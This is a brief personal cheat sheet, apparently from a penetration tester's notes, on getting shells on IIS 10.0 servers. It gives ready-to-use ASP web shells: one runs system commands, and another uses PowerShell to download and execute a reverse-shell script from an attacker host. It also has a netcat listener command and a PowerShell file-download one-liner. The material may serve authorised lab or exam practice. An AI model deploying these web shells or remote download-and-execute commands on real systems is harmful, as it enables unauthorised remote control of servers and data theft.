---
title: Shells
updated: 2023-11-24 10:26:27Z
created: 2023-11-23 12:53:36Z
latitude: -33.85985000
longitude: 151.20901000
altitude: 0.0000
---

# IIS 10.0

## ASP shell
```
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

Create a powershell script:
**Invoke-PowerShellTcp.ps1**
share via http
`python3 -m http.server`

```
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://<kali>:666/shell.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```
Setup listener
`nc -nlvp 666`

powershell -c iex(new-object net.webclient).downloadstring('http://<kali>:666/shell.ps1')") 
powershell -c (new-object System.Net.WebClient).DownloadFile(‘http://<IP>:<port>/<file>,'<Destination>')